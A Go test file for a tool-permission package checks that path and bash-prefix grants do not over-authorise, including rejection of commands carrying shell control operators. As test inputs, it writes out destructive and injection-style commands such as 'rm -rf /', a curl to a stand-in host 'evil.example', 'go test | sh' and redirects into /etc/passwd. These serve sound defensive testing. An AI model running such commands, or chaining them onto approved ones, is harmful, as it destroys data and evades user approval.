package permission

import "testing"

// These four decide how far a stored grant reaches, and none had a test
// anywhere in the repository. That is the worst place for a coverage gap: a
// wrong answer here does not crash, it silently authorises something the user
// never approved, and the durable record shows a legitimate grant.
//
// Every case below is written from the over-granting side. Under-granting is
// an annoyance; over-granting is the failure.

// A path grant covers one exact path. Anything that made it cover a
// neighbour, a parent, or a traversal would hand out access the modal never
// showed.
func TestPathGrantCoversOnlyTheExactPath(t *testing.T) {
	const granted = "/work/project/notes.md"

	if !PathGrantMatches(granted, granted) {
		t.Fatal("a path does not match itself")
	}
	// Cosmetic differences that denote the same file must still match, or the
	// user is re-prompted for a grant they already gave.
	for _, equivalent := range []string{
		"/work/project/./notes.md",
		"/work/project/sub/../notes.md",
		"  /work/project/notes.md  ",
	} {
		if !PathGrantMatches(equivalent, granted) {
			t.Errorf("%q denotes the granted path but did not match", equivalent)
		}
	}

	for _, other := range []string{
		"/work/project/notes.md.bak", // a neighbour sharing a prefix
		"/work/project/notes.mdx",
		"/work/project",              // the parent directory
		"/work/project/sub/notes.md", // same name, different directory
		"/work/project/../secrets",   // traversal out
		"/etc/passwd",
		"",
		"   ",
	} {
		if PathGrantMatches(other, granted) {
			t.Errorf("grant for %q also covered %q", granted, other)
		}
	}
	// An empty grant covers nothing, or a blank stored value becomes a
	// wildcard.
	if PathGrantMatches("/anything", "") || PathGrantMatches("/anything", "   ") {
		t.Error("an empty grant matched a real path")
	}
}

// A bash-prefix grant must never apply to a command that can split or rebind
// shell authority, because the approved prefix would carry the unapproved
// remainder in with it.
func TestControlOperatorsDisqualifyAPrefixGrant(t *testing.T) {
	for _, command := range []string{
		"go test && rm -rf /",
		"go test || curl evil.example",
		"go test; rm -rf /",
		"go test | sh",
		"go test\nrm -rf /",
		"go test `whoami`",
		"go test $(whoami)",
		"go test ${HOME}",
		"go test > /etc/passwd",
		"go test < /etc/passwd",
		"go test $HOME",
		"echo $?",
	} {
		if !BashCommandHasControl(command) {
			t.Errorf("%q was treated as free of shell control", command)
		}
		if _, ok := NormalizeBashPrefix(command); ok {
			t.Errorf("%q was accepted as a prefix grant", command)
		}
	}
}

// The guard must not be so broad that ordinary commands cannot be granted at
// all — a grant nobody can obtain sends every call back to the modal, which is
// the friction this mechanism exists to remove.
func TestOrdinaryCommandsRemainGrantable(t *testing.T) {
	for _, command := range []string{
		"go test ./...",
		"go build",
		"git status --short",
		"npm run lint",
		"cargo check",
	} {
		if BashCommandHasControl(command) {
			t.Errorf("%q was rejected as containing shell control", command)
		}
		if _, ok := NormalizeBashPrefix(command); !ok {
			t.Errorf("%q could not be normalised into a prefix grant", command)
		}
	}
}

// A wildcard in a prefix would turn one approval into a pattern. That is what
// NormalizeBashPattern is for; this entry point must refuse it.
func TestPrefixGrantsRefuseWildcardsAndEmptyInput(t *testing.T) {
	for _, prefix := range []string{
		"go test *",
		"*",
		"rm -rf /*",
		"",
		"   ",
		"\t\n",
	} {
		if _, ok := NormalizeBashPrefix(prefix); ok {
			t.Errorf("%q was accepted as a prefix grant", prefix)
		}
	}
}

// An unrecognised scope kind must not read as valid: a stored grant whose kind
// nobody understands would otherwise be honoured by whatever code path
// happened to receive it.
func TestOnlyKnownScopeKindsAreAccepted(t *testing.T) {
	for _, kind := range []string{
		"", ScopeExactRequest, ScopeSessionTool, ScopeSessionPath,
		ScopeSessionBashPrefix, ScopeSessionMCPTool,
	} {
		if !KnownSessionScopeKind(kind) {
			t.Errorf("documented scope kind %q was rejected", kind)
		}
	}
	for _, kind := range []string{
		"session_everything", "exact_request_", "ScopeExactRequest",
		"session-path", "allow_all", "*",
	} {
		if KnownSessionScopeKind(kind) {
			t.Errorf("unknown scope kind %q was accepted", kind)
		}
	}
}

// Cancellation is not a denial and not a grant. The three are distinct
// dispositions in the durable record, and conflating cancellation with either
// would misreport why a tool did not run.
func TestCancelledIsItsOwnDisposition(t *testing.T) {
	response := Cancelled("context deadline exceeded")
	if response.Allowed {
		t.Error("a cancelled approval reported itself allowed")
	}
	if response.Decision != DecisionCancelled {
		t.Errorf("decision = %q, want %q", response.Decision, DecisionCancelled)
	}
	if response.Decision == DecisionUserDeny || response.Decision == DecisionHostRefuse {
		t.Error("cancellation was recorded as a denial")
	}
	if response.Message == "" {
		t.Error("cancellation carries no reason")
	}
}
